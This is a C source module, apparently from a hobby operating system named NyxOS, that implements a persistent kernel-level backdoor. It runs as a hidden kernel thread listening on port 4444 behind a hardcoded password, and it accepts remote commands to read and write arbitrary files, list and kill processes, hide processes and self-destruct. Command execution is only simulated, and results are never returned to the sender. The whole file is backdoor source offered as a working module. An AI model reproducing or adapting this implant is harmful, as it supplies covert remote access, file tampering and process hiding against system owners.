// ============================================================
// modules/backdoor.c - Puerta trasera persistente (versión NyxOS)
// ============================================================
#include "modules.h"

#define BACKDOOR_PORT 4444
#define BACKDOOR_PASSWORD "nyxmaster"

typedef struct {
    uint32_t magic;
    char password[32];
    uint32_t command;
    uint32_t data_len;
    char data[1024];
} backdoor_packet_t;

enum {
    CMD_EXEC = 0x01,
    CMD_READ_FILE = 0x02,
    CMD_WRITE_FILE = 0x03,
    CMD_GET_PROCESSES = 0x04,
    CMD_KILL_PROCESS = 0x05,
    CMD_HIDE_PROCESS = 0x06,
    CMD_SELF_DESTRUCT = 0xFF
};

static int backdoor_socket = -1;
static bool backdoor_running = true;

static void backdoor_handler(void* data) {
    backdoor_packet_t packet;
    memcpy(&packet, data, sizeof(packet));
    if (packet.magic != 0x4E59584F) return;
    if (strncmp(packet.password, BACKDOOR_PASSWORD, 32) != 0) return;

    switch(packet.command) {
        case CMD_EXEC: {
            // Crear un proceso que ejecute el comando (simulado)
            printf("[Backdoor] Ejecutando: %s\n", packet.data);
            break;
        }
        case CMD_READ_FILE: {
            int fd = vfs_open(packet.data, O_RDONLY, 0);
            if (fd >= 0) {
                vfs_read(fd, ((backdoor_packet_t*)data)->data, 1024);
                vfs_close(fd);
            }
            break;
        }
        case CMD_WRITE_FILE: {
            int fd = vfs_open(packet.data, O_WRONLY | O_CREAT, 0644);
            if (fd >= 0) {
                vfs_write(fd, packet.data + strlen(packet.data) + 1, packet.data_len);
                vfs_close(fd);
            }
            break;
        }
        case CMD_GET_PROCESSES: {
            char* buf = ((backdoor_packet_t*)data)->data;
            int off = 0;
            for (int i = 0; i < process_count && off < 1024; i++) {
                process_t* p = process_table[i];
                off += snprintf(buf + off, 1024 - off, "PID:%u CMD:%s\n", p->pid, p->comm);
            }
            break;
        }
        case CMD_KILL_PROCESS: {
            uint32_t pid = *(uint32_t*)packet.data;
            process_t* p = find_process(pid);
            if (p) p->state = 2; // zombie
            break;
        }
        case CMD_HIDE_PROCESS: {
            uint32_t pid = *(uint32_t*)packet.data;
            hide_process(pid);
            break;
        }
        case CMD_SELF_DESTRUCT: {
            backdoor_running = false;
            break;
        }
        default: break;
    }
}

static void backdoor_listener(void) {
    backdoor_socket = net_create_raw_socket();
    if (backdoor_socket < 0) return;
    net_bind(backdoor_socket, 0, BACKDOOR_PORT);
    net_listen(backdoor_socket, 5);
    while (backdoor_running) {
        int conn = net_accept(backdoor_socket);
        if (conn >= 0) {
            char buffer[sizeof(backdoor_packet_t)];
            net_recv(conn, buffer, sizeof(buffer));
            backdoor_handler(buffer);
            net_close(conn);
        }
    }
}

void* module_backdoor_init(void) {
    kernel_thread_create("nyx_backdoor", backdoor_listener, NULL);
    return NULL;
}